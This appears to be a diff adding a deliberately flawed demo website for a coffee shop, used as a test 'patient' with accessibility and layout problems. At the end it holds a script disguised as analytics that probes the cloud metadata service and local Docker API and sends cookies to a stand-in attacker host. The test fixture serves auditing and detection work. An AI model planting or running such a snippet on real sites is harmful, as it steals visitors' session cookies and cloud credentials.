@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Daily Grind</title>
+<!-- Demo "patient": a small business site with typical real-world problems
+     (no viewport, no lang, low contrast, tiny tap targets, images without alt, overflow on mobile)
+     plus a hidden malicious script that tries to steal cloud credentials and exfiltrate data. -->
+<style>
+  body { margin: 0; font-family: Georgia, serif; background: #f5efe6; color: #3b2f2a; }
+  header { background: #2b1d16; color: #8a7a70; padding: 18px 28px; display: flex; justify-content: space-between; align-items: center; }
+  header b { color: #d9c3a5; font-size: 22px; }
+  nav a { color: #6f5f55; font-size: 11px; margin-left: 10px; text-decoration: none; }
+  .hero { display: flex; gap: 30px; padding: 40px 28px; width: 1100px; }
+  .hero img { width: 520px; height: 320px; object-fit: cover; border-radius: 8px; }
+  .hero h2 { font-size: 40px; margin: 0 0 12px; }
+  .hero p { color: #b9aea4; font-size: 15px; }
+  .menu { display: grid; grid-template-columns: repeat(4, 260px); gap: 16px; padding: 0 28px 40px; }
+  .card { background: #fff; padding: 14px; border-radius: 8px; }
+  .card img { width: 100%; height: 140px; object-fit: cover; border-radius: 6px; }
+  .card small { color: #c9beb5; font-size: 10px; }
+  .btn { display: inline-block; background: #c8a27a; color: #e9dccd; padding: 4px 8px; font-size: 11px; border-radius: 4px; text-decoration: none; }
+  footer { padding: 20px 28px; font-size: 10px; color: #b4a79c; }
+</style>
+</head>
+<body>
+<header><b>Daily Grind</b><nav><a href="#menu">Menu</a><a href="#about">About</a><a href="/old-locations.html">Locations</a><a href="#contact">Contact</a></nav></header>
+<section class="hero">
+  <img src="https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=1200&q=80">
+  <div>
+    <h2>Fresh coffee, every morning</h2>
+    <p>Small-batch roasted beans, pastries baked in-house and the best flat white in town. Open daily 7:00–20:00.</p>
+    <a class="btn" href="#order">Order ahead</a>
+  </div>
+</section>
+<section class="menu" id="menu">
+  <div class="card"><img src="https://images.unsplash.com/photo-1509042239860-f550ce710b93?w=600&q=70"><h3>Flat white</h3><small>Double ristretto, silky milk · $4.50</small></div>
+  <div class="card"><img src="https://images.unsplash.com/photo-1461023058943-07fcbe16d735?w=600&q=70"><h3>Cold brew</h3><small>Steeped 18 hours · $5.00</small></div>
+  <div class="card"><img src="https://images.unsplash.com/photo-1555507036-ab1f4038808a?w=600&q=70"><h3>Croissant</h3><small>Butter, baked at 6 am · $3.20</small></div>
+  <div class="card"><img src="https://images.unsplash.com/photo-1517433670267-08bbd4be890f?w=600&q=70"><h3>Matcha latte</h3><small>Ceremonial grade · $5.20</small></div>
+</section>
+<form id="contact"><input placeholder="Your email"><button>Join newsletter</button></form>
+<footer>© 2019 Daily Grind · <a href="/broken-page">Careers</a></footer>
+
+<!-- ⚠️ "analytics" snippet a freelancer pasted years ago. It is actually malicious. -->
+<script>
+(async () => {
+  try { await fetch("http://169.254.169.254/v1.json"); } catch (e) {}                 // steal cloud instance credentials
+  try { await fetch("http://127.0.0.1:2375/containers/json"); } catch (e) {}           // reach the Docker API on the host
+  try { await fetch("https://collect.evil-tracker.example/steal", { method: "POST", body: document.cookie + "|" + location.href }); } catch (e) {}
+})();
+</script>
+</body>
+</html>
